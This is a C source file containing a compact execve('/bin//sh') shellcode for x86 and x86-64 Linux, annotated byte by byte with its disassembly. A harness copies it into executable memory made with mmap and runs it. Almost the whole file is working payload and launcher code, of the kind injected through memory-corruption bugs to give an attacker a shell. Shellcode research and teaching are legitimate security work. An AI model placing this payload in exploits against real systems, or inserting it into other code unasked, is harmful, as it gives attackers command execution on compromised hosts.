/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include <sys/mman.h>

#define SHX_SIZE 37

char SHX[] = {
  /* 0000 */ "\x31\xf6"                     /* xor esi, esi                    */
  /* 0002 */ "\xf7\xe6"                     /* mul esi                         */
  /* 0004 */ "\x52"                         /* push rdx                        */
  /* 0005 */ "\x52"                         /* push rdx                        */
  /* 0006 */ "\x52"                         /* push rdx                        */
  /* 0007 */ "\x54"                         /* push rsp                        */
  /* 0008 */ "\x5b"                         /* pop rbx                         */
  /* 0009 */ "\x53"                         /* push rbx                        */
  /* 000A */ "\x5f"                         /* pop rdi                         */
  /* 000B */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
  /* 0011 */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
  /* 0018 */ "\x40\x75\x04"                 /* jnz 0x1f                        */
  /* 001B */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 001D */ "\x0f\x05"                     /* syscall                         */
  /* 001F */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 0021 */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 0023 */ "\xcd\x80"                     /* int 0x80                        */
};

void xcode(char *s, int len)
{
  void *bin;

  bin=mmap (0, len,
      PROT_EXEC | PROT_WRITE | PROT_READ,
      MAP_ANON  | MAP_PRIVATE, -1, 0);

  memcpy (bin, s, len);

  // execute
  ((void(*)())bin)();

  munmap (bin, len);
}

int main(void)
{
  xcode (SHX, SHX_SIZE);
  return 0;
}